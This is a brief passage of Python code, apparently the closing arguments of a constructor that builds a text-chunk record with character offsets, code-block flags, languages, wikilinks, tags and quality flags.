        char_start=0,
        char_end=len(text),
        text=text,
        contains_code_block=contains_code_block,
        code_languages=code_languages or [],
        wikilinks=[],
        tags=[],
        frontmatter_tags=[],
        quality_flags=[],
    )
